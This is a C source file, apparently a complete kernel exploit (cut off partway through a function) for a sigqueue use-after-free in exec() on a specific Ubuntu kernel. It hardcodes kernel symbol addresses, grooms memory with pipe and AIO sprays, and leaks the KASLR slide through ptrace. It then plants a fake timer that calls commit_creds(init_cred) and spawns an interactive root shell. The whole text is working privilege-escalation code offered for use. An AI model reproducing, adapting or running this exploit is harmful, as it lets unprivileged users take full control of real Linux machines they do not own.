/*
 * Signal (CVE-2026-98256): sigqueue UAF in exec()
 *
 * Target: Ubuntu 26.04 7.0.0-30-generic
 *
 * Copyright (c) 2026 Hyunwoo Kim (@v4bel)
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <linux/membarrier.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

extern char **environ;

#ifndef SIGEV_THREAD_ID
#define SIGEV_THREAD_ID 4
#endif
#ifndef MAP_FIXED_NOREPLACE
#define MAP_FIXED_NOREPLACE 0x100000
#endif
#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

#define STOCK_POSIX_TIMER_FN 0xffffffff815840f0ULL
#define STOCK_COMMIT_CREDS 0xffffffff8148a520ULL
#define STOCK_INIT_CRED 0xffffffff83a15b80ULL
#define STOCK_CALL_GADGET 0xffffffff81cb2d20ULL

#define EXEC_LEAD_NS 80000LL
#define TIMER_SPRAY_COUNT 20000
#define CALLBACK_DELAY_NS 100000LL
#define CALLBACK_GROUP_SIZE 16
#define CALLBACK_GROUP_GAP_NS 4700LL
#define CALLBACK_TIMER_LIMIT 12288
#define CALLBACK_CPU 0
#define ATTEMPTS_PER_CONTROLLER 100
#define MAX_TIMING_RUNS 24
#define TIMING_RUN_TIMEOUT_NS 180000000000LL

#define AIO_MARKER_BASE 0x53544f4e00000000ULL
#define AIO_PREWARM_SMALL 128
#define AIO_PREWARM_LARGE 128
#define PCP_CONDITION_PAGES 4096
#define PIPE_SEARCH_PAGES 8192
#define MAX_PCP_PIPES 256
#define PIPE_RESERVED_PREFIX_PAGES 2
#define PIPE_HIGH_LAYOUT_PAGES 512
#define MAX_AIO_GUARD_PAGES 32
#define DRAIN_PIPE_PAGES 1536
#define AIO_SEARCH_WAVES 8
#define AIO_SEARCH_WAVE_GAP_US 200000
#define AIO_RECLAIM_RETRIES 3
#define SENTINEL_TAG 0x53454e54
#define SENTINEL_INTERVAL_NS 100000LL
#define SENTINEL_SCAN_LIMIT 64
#define POST_EXEC_ENV "SIGQUEUE_POST_7f3a91c2"

typedef unsigned long kernel_aio_context_t;

struct kernel_symbol_profile {
	uint64_t posix_timer_fn;
	uint64_t commit_creds;
	uint64_t init_cred;
	uint64_t call_gadget;
};

static const struct kernel_symbol_profile kernel_symbols = {
	.posix_timer_fn = STOCK_POSIX_TIMER_FN,
	.commit_creds = STOCK_COMMIT_CREDS,
	.init_cred = STOCK_INIT_CRED,
	.call_gadget = STOCK_CALL_GADGET,
};

static const unsigned reclaim_delay_table_us[] = {
	400000, 600000, 250000, 800000, 500000, 1200000, 300000, 700000,
};
static unsigned reclaim_delay_us = 500000;
static pid_t old_leader_tid;
static int timer_signal;
static int sentinel_signal;
static int probe_ready_fd = -1;
static int probe_ack_fd = -1;
static int notify_fd = -1;
static int exe_fd = -1;
static int online_cpus = 4;
static rlim_t saved_sigpending_max;

struct probe_reply {
	int peek_count;
	siginfo_t info;
	int aio_status;
	int stale_slot;
	uint64_t kaslr_slide;
};

struct probe_request {
	uint64_t off;
	int32_t nr;
	uint8_t command;
	uint8_t reserved[3];
	uint64_t arg0;
	uint64_t arg1;
};

struct peeksiginfo_args {
	uint64_t off;
	uint32_t flags;
	int32_t nr;
};

#define PREEMPT_STACK_SIZE (1U << 20)

struct preempt_train_args {
	int64_t target;
	int command;
	unsigned int flags;
	int cpu_id;
	int source_cpu;
	pid_t worker_tid;
};

static struct preempt_train_args exit_watcher_args;
static struct preempt_train_args sentinel_sender_args;
static int preempt_gate;
static kernel_aio_context_t parent_mapped_context;
static void *parent_aio_guards[MAX_AIO_GUARD_PAGES];
static int parent_aio_guard_count;
static int parent_search_pipes[MAX_PCP_PIPES][2];
static int parent_search_pipe_pages[MAX_PCP_PIPES];
static int parent_search_pipe_count;
static int parent_drain_pipes[MAX_PCP_PIPES][2];
static int parent_drain_pipe_count;

static int *post_spray_ids;
static int post_spray_count;
static int *post_flush_ids;
static int post_flush_count;

static int64_t mono_ns(void)
{
	struct timespec ts;

	if (clock_gettime(CLOCK_MONOTONIC, &ts)) {
		perror("clock_gettime");
		_exit(2);
	}
	return (int64_t)ts.tv_sec * 1000000000LL + ts.tv_nsec;
}

static uint64_t siginfo_word(const siginfo_t *info, size_t offset)
{
	uint64_t value;

	memcpy(&value, (const unsigned char *)info + offset, sizeof(value));
	return value;
}

static ssize_t read_full(int fd, void *buffer, size_t length)
{
	unsigned char *cursor = buffer;
	size_t done = 0;

	while (done < length) {
		ssize_t ret = read(fd, cursor + done, length - done);

		if (ret > 0) {
			done += (size_t)ret;
			continue;
		}
		if (ret < 0 && errno == EINTR)
			continue;
		return ret < 0 ? -1 : (ssize_t)done;
	}
	return (ssize_t)done;
}

static ssize_t write_full(int fd, const void *buffer, size_t length)
{
	const unsigned char *cursor = buffer;
	size_t done = 0;

	while (done < length) {
		ssize_t ret = write(fd, cursor + done, length - done);

		if (ret > 0) {
			done += (size_t)ret;
			continue;
		}
		if (ret < 0 && errno == EINTR)
			continue;
		return -1;
	}
	return (ssize_t)done;
}

static void notify_controller(char code)
{
	if (notify_fd >= 0)
		(void)write_full(notify_fd, &code, 1);
}

static const int exploit_interrupt_signals[] = {
	SIGHUP,	 SIGINT,    SIGQUIT, SIGPIPE, SIGALRM, SIGTERM,
	SIGUSR1, SIGUSR2,   SIGTSTP, SIGTTIN, SIGTTOU, SIGXCPU,
	SIGXFSZ, SIGVTALRM, SIGPROF, SIGIO,   SIGPWR,
};

static void ignore_exploit_interrupt_signals(void)
{
	for (size_t i = 0; i < sizeof(exploit_interrupt_signals) /
				       sizeof(exploit_interrupt_signals[0]);
	     i++)
		signal(exploit_interrupt_signals[i], SIG_IGN);

	signal(SIGCHLD, SIG_IGN);
}

static void restore_exploit_interrupt_signals(void)
{
	for (size_t i = 0; i < sizeof(exploit_interrupt_signals) /
				       sizeof(exploit_interrupt_signals[0]);
	     i++)
		signal(exploit_interrupt_signals[i], SIG_DFL);
	signal(SIGCHLD, SIG_DFL);
}

static void pin_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu % online_cpus, &set);
	(void)sched_setaffinity(0, sizeof(set), &set);
}

static int parent_guard_aio_pmd(void *mapping)
{
	uintptr_t pmd = (uintptr_t)mapping & ~((uintptr_t)(1U << 21) - 1);

	for (int i = 0; i < parent_aio_guard_count; i++) {
		if (((uintptr_t)parent_aio_guards[i] &
		     ~((uintptr_t)(1U << 21) - 1)) == pmd)
			return 0;
	}
	if (parent_aio_guard_count >= MAX_AIO_GUARD_PAGES)
		return -ENOSPC;
	for (int page = 1; page < 512; page++) {
		void *candidate = (void *)(pmd + (uintptr_t)page * 4096);
		void *guard =
			mmap(candidate, 4096, PROT_READ | PROT_WRITE,
			     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE,
			     -1, 0);

		if (guard == MAP_FAILED)
			continue;
		*(volatile unsigned char *)guard = 0;
		(void)madvise(guard, 4096, MADV_DONTFORK);
		parent_aio_guards[parent_aio_guard_count++] = guard;
		return 0;
	}
	return -ENOMEM;
}

static int parent_size_pipe(int fd)
{
	int capacity;

	(void)fcntl(fd, F_SETPIPE_SZ, 1U << 20);
	capacity = fcntl(fd, F_GETPIPE_SZ);
	if (capacity < 4096 || capacity % 4096)
		return -EINVAL;
	return capacity / 4096;
}

static void parent_close_search_pipes(void)
{
	for (int i = 0; i < parent_search_pipe_count; i++) {
		if (parent_search_pipes[i][0] >= 0)
			close(parent_search_pipes[i][0]);
		if (parent_search_pipes[i][1] >= 0)
			close(parent_search_pipes[i][1]);
	}
	parent_search_pipe_count = 0;
}

static void parent_pcp_kick(int pages)
{
	enum { max_pipes = 16 };
	unsigned char page[4096] = { 0 };
	int fds[max_pipes][2];
	int held = 0;

	while (pages > 0 && held < max_pipes) {
		int capacity;

		if (pipe2(fds[held], O_CLOEXEC | O_NONBLOCK))
			break;
		held++;
		capacity = parent_size_pipe(fds[held - 1][1]);
		if (capacity < 1)
			break;
		if (capacity > pages)
			capacity = pages;
		while (capacity-- > 0 &&
		       write(fds[held - 1][1], page, sizeof(page)) ==
			       (ssize_t)sizeof(page))
			pages--;
	}
	for (int i = 0; i < held; i++) {
		close(fds[i][0]);
		close(fds[i][1]);
	}
}

static int parent_prepare_search_pipes(void)
{
	unsigned char page[4096] = { 0 };
	int usable = 0;

	memset(parent_search_pipes, -1, sizeof(parent_search_pipes));
	while (parent_search_pipe_count < MAX_PCP_PIPES &&
	       usable < PIPE_SEARCH_PAGES + PIPE_HIGH_LAYOUT_PAGES) {
		int index = parent_search_pipe_count;
		int pages;

		if (pipe2(parent_search_pipes[index], O_CLOEXEC))
			return -errno;
		pages = parent_size_pipe(parent_search_pipes[index][1]);
		if (pages < PIPE_RESERVED_PREFIX_PAGES + 1)
			return pages < 0 ? pages : -ENOSPC;
		for (int i = 0; i < PIPE_RESERVED_PREFIX_PAGES; i++) {
			if (write_full(parent_search_pipes[index][1], page,
				       sizeof(page)) != sizeof(page))
				return -(errno ? errno : EIO);
		}
		parent_search_pipe_pages[index] = pages;
		parent_search_pipe_count++;
		usable += pages - PIPE_RESERVED_PREFIX_PAGES;
	}
	return usable >= PIPE_SEARCH_PAGES + PIPE_HIGH_LAYOUT_PAGES ? 0 :
								      -ENOSPC;
}

static int parent_prepare_drain_pipes(void)
{
	unsigned char page[4096] = { 0 };
	int total = 0;

	memset(parent_drain_pipes, -1, sizeof(parent_drain_pipes));
	while (parent_drain_pipe_count < MAX_PCP_PIPES &&
	       total < DRAIN_PIPE_PAGES) {
		int index = parent_drain_pipe_count;
		int pages;

		if (pipe2(parent_drain_pipes[index], O_CLOEXEC))
			return -errno;
		pages = parent_size_pipe(parent_drain_pipes[index][1]);
		if (pages < 1)
			return pages < 0 ? pages : -ENOSPC;
		parent_drain_pipe_count++;
		while (pages-- > 0 && total < DRAIN_PIPE_PAGES) {
			if (write_full(parent_drain_pipes[index][1], page,
				       sizeof(page)) != sizeof(page))
				return -(errno ? errno : EIO);
			total++;
		}
	}
	return total == DRAIN_PIPE_PAGES ? 0 : -ENOSPC;
}

static void parent_release_drain_pipes(void)
{
	for (int i = 0; i < parent_drain_pipe_count; i++) {
		if (parent_drain_pipes[i][0] >= 0)
			close(parent_drain_pipes[i][0]);
		if (parent_drain_pipes[i][1] >= 0)
			close(parent_drain_pipes[i][1]);
		parent_drain_pipes[i][0] = -1;
		parent_drain_pipes[i][1] = -1;
	}
	parent_drain_pipe_count = 0;
}

static int parent_condition_pcp(void)
{
	unsigned char page[4096] = { 0 };
	int pipes[MAX_PCP_PIPES][2];
	int filled[MAX_PCP_PIPES] = { 0 };
	int count = 0;
	int total = 0;
	int error = 0;

	memset(pipes, -1, sizeof(pipes));
	while (count < MAX_PCP_PIPES && total < PCP_CONDITION_PAGES) {
		int pages;

		if (pipe2(pipes[count], O_CLOEXEC)) {
			error = errno;
			break;
		}
		pages = parent_size_pipe(pipes[count][1]);
		if (pages < 1) {
			error = pages < 0 ? -pages : ENOSPC;
			break;
		}
		while (filled[count] < pages && total < PCP_CONDITION_PAGES) {
			if (write_full(pipes[count][1], page, sizeof(page)) !=
			    sizeof(page)) {
				error = errno ? errno : EIO;
				break;
			}
			filled[count]++;
			total++;
		}
		count++;
		if (error)
			break;
	}

	for (int i = 0; i < count; i++) {
		if (pipes[i][0] >= 0)
			close(pipes[i][0]);
		if (pipes[i][1] >= 0)
			close(pipes[i][1]);
	}
	if (error)
		return -error;
	return total == PCP_CONDITION_PAGES ? 0 : -ENOSPC;
}

static int parent_aio_prewarm(void)
{
	static int complete;
	kernel_aio_context_t small[AIO_PREWARM_SMALL] = { 0 };
	kernel_aio_context_t large[AIO_PREWARM_LARGE] = { 0 };
	int made_small = 0;
	int made_large = 0;
	int error = 0;

	if (complete)
		return 0;
	for (int i = 0; i < AIO_PREWARM_SMALL; i++) {
		if (syscall(SYS_io_setup, 1, &small[i])) {
			error = errno;
			goto destroy;
		}
		made_small++;
		(void)*(volatile unsigned char *)(uintptr_t)small[i];
		if (parent_guard_aio_pmd((void *)(uintptr_t)small[i])) {
			error = ENOMEM;
			goto destroy;
		}
	}
	for (int i = 0; i < AIO_PREWARM_LARGE; i++) {
		if (syscall(SYS_io_setup, 510, &large[i])) {
			error = errno;
			goto destroy;
		}
		made_large++;
		for (int page = 0; page < 8; page++)
			(void)*(volatile unsigned char *)((uintptr_t)large[i] +
							  (uintptr_t)page *
								  4096);
		if (parent_guard_aio_pmd((void *)(uintptr_t)large[i])) {
			error = ENOMEM;
			goto destroy;
		}
	}

destroy:
	for (int i = made_large - 1; i >= 0; i--)
		(void)syscall(SYS_io_destroy, large[i]);
	for (int i = made_small - 1; i >= 0; i--)
		(void)syscall(SYS_io_destroy, small[i]);
	if (error)
		return -error;

	usleep(1000000);
	error = parent_prepare_search_pipes();
	if (error)
		return error;
	error = parent_prepare_drain_pipes();
	if (error)
		return error;
	error = parent_condition_pcp();
	if (error)
		return error;

	complete = 1;
	return 0;
}

static int parent_peek_stopped(pid_t child, uint64_t off,
			       struct probe_reply *reply)
{
	struct peeksiginfo_args args = {
		.off = off,
		.flags = 0,
		.nr = 1,
	};
	long ret;

	memset(&reply->info, 0, sizeof(reply->info));
	errno = 0;
	ret = ptrace(PTRACE_PEEKSIGINFO, child, &args, &reply->info);
	if (ret < 0) {
		reply->peek_count = -1;
		return -errno;
	}
	reply->peek_count = (int)ret;
	return ret == 1 ? 0 : -ENOENT;
}

static uint64_t parent_aio_marker(int serial, int slot)
{
	return AIO_MARKER_BASE | ((uint64_t)(unsigned int)serial << 8) |
	       (uint64_t)(unsigned int)slot;
}

static void store_u64(unsigned char *buffer, size_t offset, uint64_t value)
{
	memcpy(buffer + offset, &value, sizeof(value));
}

static void store_u32(unsigned char *buffer, size_t offset, uint32_t value)
{
	memcpy(buffer + offset, &value, sizeof(value));
}

static void store_s32(unsigned char *buffer, size_t offset, int32_t value)
{
	memcpy(buffer + offset, &value, sizeof(value));
}

static void parent_prepare_low_page(unsigned char *page, uint64_t slab_base,
				    int serial, int clear)
{
	if (clear)
		memset(page, 0, 4096);
	for (int slot = 0; slot <= 20; slot++) {
		size_t offset = ((size_t)slot * 0x180 + 0xb0) & 0xfff;

		store_u64(page, offset, parent_aio_marker(serial, slot));
	}
	for (int slot = 0; slot <= 10; slot++) {
		size_t list_offset = (size_t)slot * 0x180 + 0x88;

		store_u64(page, list_offset, slab_base + 0xfd8);
	}

	store_s32(page, 0xff0, timer_signal);
	store_s32(page, 0xff8, SI_TIMER);
}

static void parent_build_fake_page(unsigned char *page, uint64_t slab_base,
				   uint64_t fake_page, int stale_slot,
				   size_t timer_offset, size_t decoy_offset,
				   uint64_t slide, int serial,
				   uint64_t cookie[4])
{
	uint64_t kclock = fake_page + 0x200;
	uint64_t pivot = fake_page + 0x300;
	uint64_t queue = fake_page + timer_offset + 0x88;
	uint64_t decoy = fake_page + decoy_offset;
	uint64_t stale = slab_base + (uint64_t)stale_slot * 0x180 + 0x88;

	memset(page, 0, 4096);
	cookie[0] = AIO_MARKER_BASE | 0x41;
	cookie[1] = ~cookie[0];
	cookie[2] = (uint64_t)(unsigned int)serial;
	cookie[3] = 0x4849474850414745ULL;
	memcpy(page, cookie, 4 * sizeof(cookie[0]));

	store_u64(page, timer_offset + 0x88, decoy);
	store_u64(page, timer_offset + 0x90, stale);
	store_u32(page, timer_offset + 0x98, 1);
	store_s32(page, timer_offset + 0xa0, timer_signal);
	store_s32(page, timer_offset + 0xa4, 0);
	store_s32(page, timer_offset + 0xa8, SI_TIMER);
	store_u64(page, decoy_offset, stale);
	store_u64(page, decoy_offset + 8, queue);
	store_s32(page, decoy_offset + 0x18, timer_signal);

	store_u64(page, timer_offset, kernel_symbols.init_cred + slide);
	store_u64(page, timer_offset + 8, pivot);
	store_u64(page, timer_offset + 0x10,
		  kernel_symbols.commit_creds + slide);
	store_u64(page, timer_offset + 0x30, 0);
	store_u64(page, timer_offset + 0x38, kclock);
	store_u32(page, timer_offset + 0x40, 0);
	store_u32(page, timer_offset + 0x44, 2);
	store_u64(page, timer_offset + 0x50, 0);
	store_u64(page, timer_offset + 0x58, 0);
	store_u32(page, timer_offset + 0x60, 0);
	store_u32(page, timer_offset + 0x64, 0);
	store_u64(page, timer_offset + 0x68, 1);
	store_u64(page, timer_offset + 0x80, 0);
	store_u64(page, timer_offset + 0xd0, 0);
	store_u32(page, timer_offset + 0xd8, 1);
	store_u64(page, 0x250, kernel_symbols.call_gadget + slide);
	store_u64(page, 0x318, kernel_symbols.commit_creds + slide);
}

static int parent_decode_kaslr(uint64_t leak, uint64_t *slide)
{
	uint64_t candidate;

	if ((leak >> 48) != 0xffff || leak < kernel_symbols.posix_timer_fn)
		return -ESTALE;
	candidate = leak - kernel_symbols.posix_timer_fn;
	if ((candidate & ((1ULL << 21) - 1)) || candidate > (1ULL << 30))
		return -ESTALE;
	*slide = candidate;
	return 0;
}

static int parent_aio_hunt(pid_t child, uint64_t slab_base, uint64_t stale_off,
			   struct probe_reply *reply)
{
	unsigned char page[4096];
	unsigned char drain[4096];
	int used[MAX_PCP_PIPES];
	int winning_pipe = -1;
	int stale_slot = -1;
	int search_serial = 0;
	int high_orientation;
	uint64_t leak = 0;
	uint64_t slide = 0;
	int err;

	if ((slab_base >> 48) != 0xffff || (slab_base & 0x1fff) ||
	    !parent_search_pipe_count)
		return -EINVAL;
	parent_release_drain_pipes();

	for (int search_wave_index = 0; search_wave_index < AIO_SEARCH_WAVES;
	     search_wave_index++) {
		if (search_wave_index) {
			usleep(AIO_SEARCH_WAVE_GAP_US);
			parent_pcp_kick(1024);
		} else {
			usleep(150000);
		}

		parent_close_search_pipes();
		if (parent_prepare_search_pipes())
			return -ENOENT;
		search_serial = 0;
		stale_slot = -1;
		winning_pipe = -1;
		for (int i = 0; i < parent_search_pipe_count; i++)
			used[i] = PIPE_RESERVED_PREFIX_PAGES;
		for (int pipe_index = 0;
		     pipe_index < parent_search_pipe_count &&
		     search_serial < PIPE_SEARCH_PAGES;
		     pipe_index++) {
			while (used[pipe_index] <
				       parent_search_pipe_pages[pipe_index] &&
			       search_serial < PIPE_SEARCH_PAGES) {
				uint64_t observed;

				search_serial++;
				parent_prepare_low_page(page, slab_base,
							search_serial, 1);
				if (write_full(
					    parent_search_pipes[pipe_index][1],
					    page, sizeof(page)) != sizeof(page))
					return -(errno ? errno : EIO);
				used[pipe_index]++;
				if (parent_peek_stopped(child, stale_off,
							reply))
					return -EIO;
				observed = siginfo_word(&reply->info, 16);
				for (int slot = 0; slot <= 20; slot++) {
					if (observed !=
					    parent_aio_marker(search_serial,
							      slot))
						continue;
					stale_slot = slot;
					winning_pipe = pipe_index;
					break;
				}
				if (stale_slot >= 0)
					break;
			}
			if (stale_slot >= 0)
				break;
		}
		if (stale_slot >= 0)
			break;
	}
	if (winning_pipe < 0)
		return -ENOENT;
	reply->stale_slot = stale_slot;
	high_orientation = stale_slot > 10;
	if (!high_orientation) {
		if (parent_peek_stopped(child, stale_off + 1, reply))
			return -EIO;
		leak = siginfo_word(&reply->info, 24);
		if (parent_decode_kaslr(leak, &slide))
			return -ESTALE;
		reply->kaslr_slide = slide;
	}

	for (int i = 0; i < used[winning_pipe]; i++) {
		if (read_full(parent_search_pipes[winning_pipe][0], drain,
			      sizeof(drain)) != sizeof(drain))
			return -(errno ? errno : EIO);
	}
	if (syscall(SYS_io_setup, 1, &parent_mapped_context))
		return -errno;
	unsigned char *mapped_user =
		(unsigned char *)(uintptr_t)parent_mapped_context;
	int remap_serial = 0x00f001;

	parent_prepare_low_page(mapped_user, slab_base, remap_serial, 0);
	if (parent_peek_stopped(child, stale_off, reply) ||
	    siginfo_word(&reply->info, 16) !=
		    parent_aio_marker(remap_serial, stale_slot)) {
		err = -ESTALE;
		goto drop_ring;
	}

	size_t stale_page_offset = ((size_t)stale_slot * 0x180 + 0x88) & 0xfff;

	if (high_orientation) {
		uint64_t cookie[4];
		uint64_t fake_page = slab_base + 0x1000;
		uint64_t queue = fake_page + 0x388;
		uint64_t decoy = fake_page + 0xf80;
		int found_text = 0;

		for (uint64_t radius = 1; radius <= 1024 && !found_text;
		     radius++) {
			for (int direction = 0; direction < 2; direction++) {
				uint64_t distance = radius * 0x2000;
				uint64_t block = direction ?
							 slab_base - distance :
							 slab_base + distance;
				uint64_t candidate_slide;

				store_u64(mapped_user, stale_page_offset,
					  block + 0x108 - 0x18);
				__atomic_thread_fence(__ATOMIC_SEQ_CST);
				if (parent_peek_stopped(child, stale_off + 1,
							reply)) {
					err = -EIO;
					goto drop_ring;
				}
				leak = siginfo_word(&reply->info, 0);
				if (parent_decode_kaslr(leak, &candidate_slide))
					continue;
				store_u64(mapped_user, stale_page_offset,
					  block + 0x288 - 0x18);
				__atomic_thread_fence(__ATOMIC_SEQ_CST);
				if (parent_peek_stopped(child, stale_off + 1,
							reply)) {
					err = -EIO;
					goto drop_ring;
				}
				if (siginfo_word(&reply->info, 0) != leak)
					continue;
				slide = candidate_slide;
				found_text = 1;
				break;
			}
		}
		if (!found_text) {
			err = -ESTALE;
			goto drop_ring;
		}
		reply->kaslr_slide = slide;

		parent_build_fake_page(mapped_user, slab_base, fake_page,
				       stale_slot, 0x300, 0xf80, slide, 0,
				       cookie);
		store_u64(mapped_user, stale_page_offset, queue);
		store_u64(mapped_user, stale_page_offset + 8, decoy);
		store_s32(mapped_user, stale_page_offset + 0x18, 0);
		__atomic_thread_fence(__ATOMIC_SEQ_CST);
		return 0;
	}

	int high_serial = 0;

	for (int pipe_index = winning_pipe;
	     pipe_index < parent_search_pipe_count &&
	     high_serial < PIPE_HIGH_LAYOUT_PAGES + PIPE_RESERVED_PREFIX_PAGES;
	     pipe_index++) {
		int available = parent_search_pipe_pages[pipe_index];

		if (pipe_index != winning_pipe)
			available -= used[pipe_index];
		for (int i = 0;
		     i < available &&
		     high_serial < PIPE_HIGH_LAYOUT_PAGES +
					   PIPE_RESERVED_PREFIX_PAGES;
		     i++) {
			uint64_t cookie[4];

			high_serial++;
			uint64_t fake_page = slab_base + 0x1000;

			parent_build_fake_page(page, slab_base, fake_page,
					       stale_slot, 0x800, 0xa00, slide,
					       high_serial, cookie);
			if (write_full(parent_search_pipes[pipe_index][1], page,
				       sizeof(page)) != sizeof(page)) {
				err = -(errno ? errno : EIO);
				goto drop_ring;
			}
			if (parent_peek_stopped(child, stale_off + 1, reply)) {
				err = -EIO;
				goto drop_ring;
			}
			if (memcmp((unsigned char *)&reply->info + 16, cookie,
				   sizeof(cookie)))
				continue;
			uint64_t queue = fake_page + 0x888;
			uint64_t decoy = fake_page + 0xa00;

			store_u64(mapped_user, stale_page_offset, queue);
			store_u64(mapped_user, stale_page_offset + 8, decoy);
			store_s32(mapped_user, stale_page_offset + 0x18, 0);
			__atomic_thread_fence(__ATOMIC_SEQ_CST);
			return 0;
		}
	}
	err = -ENOENT;

drop_ring:

	(void)syscall(SYS_io_destroy, parent_mapped_context);
	parent_mapped_context = 0;
	return err;
}

static int ptrace_probe_child(pid_t child, int ready_fd, int ack_fd,
			      struct probe_reply *reply)
{
	struct peeksiginfo_args args;
	struct probe_request request;
	int status;
	int attached = 0;
	long ret;

	memset(reply, 0, sizeof(*reply));
	reply->peek_count = -1;

	reply->aio_status = -EIO;
	if (read_full(ready_fd, &request, sizeof(request)) !=
	    (ssize_t)sizeof(request))
		return -1;
	if (request.command == 'D')
		return 1;
	if (request.command == 'S')
		return 2;
	if ((request.command != 'P' && request.command != 'W' &&
	     request.command != 'A') ||
	    (request.command == 'P' && request.nr < 1)) {
		goto acknowledge;
	}
	args.off = request.off;
	args.flags = 0;
	args.nr = request.nr;
	if (ptrace(PTRACE_SEIZE, child, NULL, NULL)) {
		goto acknowledge;
	}
	attached = 1;
	if (ptrace(PTRACE_INTERRUPT, child, NULL, NULL)) {
		goto acknowledge;
	}
	if (waitpid(child, &status, __WALL) != child || !WIFSTOPPED(status)) {
		goto acknowledge;
	}
	if (request.command == 'W') {
		reply->aio_status = parent_aio_prewarm();
		goto acknowledge;
	}
	if (request.command == 'A') {
		reply->aio_status = parent_aio_hunt(child, request.arg0,
						    request.arg1, reply);
		goto acknowledge;
	}
	errno = 0;
	ret = ptrace(PTRACE_PEEKSIGINFO, child, &args, &reply->info);
	if (ret >= 0)
		reply->peek_count = (int)ret;

acknowledge:
	if (write_full(ack_fd, reply, sizeof(*reply)) != sizeof(*reply))
		perror("probe reply write");
	if (attached)
		(void)ptrace(PTRACE_DETACH, child, NULL, NULL);
	return 0;
}

static int request_parent_action(uint8_t command, uint64_t arg0, uint64_t arg1,
				 struct probe_reply *reply)
{
	struct probe_request request = {
		.command = command,
		.arg0 = arg0,
		.arg1 = arg1,
	};

	if (write_full(probe_ready_fd, &request, sizeof(request)) !=
		    (ssize_t)sizeof(request) ||
	    read_full(probe_ack_fd, reply, sizeof(*reply)) !=
		    (ssize_t)sizeof(*reply))
		return -1;
	return 0;
}

static int request_pending_peek(uint64_t off, int nr, struct probe_reply *reply)
{
	struct probe_request request = {
		.off = off,
		.nr = nr,
		.command = 'P',
	};

	if (write_full(probe_ready_fd, &request, sizeof(request)) !=
		    (ssize_t)sizeof(request) ||
	    read_full(probe_ack_fd, reply, sizeof(*reply)) !=
		    (ssize_t)sizeof(*reply))
		return -1;
	return reply->peek_count;
}

static void finish_probe_protocol(char code)
{
	struct probe_request request = { .command = (uint8_t)code };

	if (probe_ready_fd >= 0)
		(void)write_full(probe_ready_fd, &request, sizeof(request));
}

static __attribute__((noreturn)) void park_poisoned_queue(void)
{
	static int futex_word;

	(void)prctl(PR_SET_NAME, "sigqueue-hold", 0, 0, 0);
	ignore_exploit_interrupt_signals();

	(void)setsid();
	fprintf(stderr, "[!] pid %d holds a poisoned queue, do not kill it\n",
		(int)syscall(SYS_getpid));
	for (;;)
		(void)syscall(SYS_futex, &futex_word, FUTEX_WAIT_PRIVATE, 0,
			      NULL, NULL, 0);
}

static __attribute__((noreturn)) void
cleanup_and_park_on_failure(const char *stage)
{
	fprintf(stderr, "[-] %s failed\n", stage);
	for (int i = 0; i < post_spray_count; i++) {
		if (post_spray_ids[i] >= 0)
			(void)syscall(SYS_timer_delete, post_spray_ids[i]);
	}
	for (int i = 0; i < post_flush_count; i++) {
		if (post_flush_ids[i] >= 0)
			(void)syscall(SYS_timer_delete, post_flush_ids[i]);
	}
	notify_controller('F');
	park_poisoned_queue();
}

static __attribute__((noreturn)) void run_root_shell(void)
{
	static char *const bash_argv[] = { (char *)"bash", (char *)"-i", NULL };
	static char *const sh_argv[] = { (char *)"sh", (char *)"-i", NULL };
	struct rlimit limit = {
		.rlim_cur = saved_sigpending_max,
		.rlim_max = saved_sigpending_max,
	};
	cpu_set_t set;
	sigset_t empty;
	int status = 0;
	long shell;

	(void)setrlimit(RLIMIT_SIGPENDING, &limit);
	CPU_ZERO(&set);
	for (int cpu = 0; cpu < online_cpus; cpu++)
		CPU_SET(cpu, &set);
	(void)sched_setaffinity(0, sizeof(set), &set);
	sigemptyset(&empty);
	(void)sigprocmask(SIG_SETMASK, &empty, NULL);
	signal(SIGCHLD, SIG_DFL);
	if (notify_fd >= 0)
		(void)fcntl(notify_fd, F_SETFD, FD_CLOEXEC);

	fprintf(stderr, "[+] uid=0, entering root shell\n");
	notify_controller('R');
	shell = syscall(SYS_clone, (unsigned long)SIGCHLD, NULL, NULL, NULL,
			0UL);
	if (!shell) {
		restore_exploit_interrupt_signals();
		execve("/bin/bash", bash_argv, environ);
		execve("/bin/sh", sh_argv, environ);
		_exit(127);
	}
	if (shell > 0)
		(void)syscall(SYS_wait4, (pid_t)shell, &status, 0, NULL);
	if (shell < 0 || (WIFEXITED(status) && WEXITSTATUS(status) == 127))
		fprintf(stderr, "[-] could not execute a shell\n");
	notify_controller('X');
	_exit(0);
}

static __attribute__((noreturn)) void trigger_fake_timer_and_finish(void)
{
	struct rlimit limit;
	struct timespec timeout = { 0, 0 };
	siginfo_t info;
	uint64_t mask = 1ULL << (timer_signal - 1);
	pid_t pid = (pid_t)syscall(SYS_getpid);
	pid_t tid = (pid_t)syscall(SYS_gettid);
	long result;

	if (getrlimit(RLIMIT_SIGPENDING, &limit))
		goto failed;
	limit.rlim_cur = 0;
	if (setrlimit(RLIMIT_SIGPENDING, &limit))
		goto failed;
	memset(&info, 0, sizeof(info));
	info.si_signo = timer_signal;
	info.si_code = SI_USER;
	info.si_pid = pid;
	info.si_uid = getuid();

	if (syscall(SYS_rt_tgsigqueueinfo, pid, tid, timer_signal, &info))
		goto failed;

	result = syscall(SYS_rt_sigtimedwait, &mask, NULL, &timeout,
			 sizeof(mask));
	if (result != timer_signal || geteuid() || getuid())
		goto failed;

	result = syscall(SYS_clone, (unsigned long)SIGCHLD, NULL, NULL, NULL,
			 0UL);
	if (!result)
		run_root_shell();
	if (result < 0) {
		cleanup_and_park_on_failure("root clone");
	}

	for (int i = 0; i < post_spray_count; i++) {
		if (post_spray_ids[i] >= 0)
			(void)syscall(SYS_timer_delete, post_spray_ids[i]);
	}
	park_poisoned_queue();

failed:
	cleanup_and_park_on_failure("fake timer delivery");
}

static struct timespec ns_to_ts(int64_t ns)
{
	struct timespec ts = {
		.tv_sec = ns / 1000000000LL,
		.tv_nsec = ns % 1000000000LL,
	};

	return ts;
}

static int ktimer_create_for_tid(pid_t tid, int tag)
{
	struct sigevent sev;
	int id = -1;

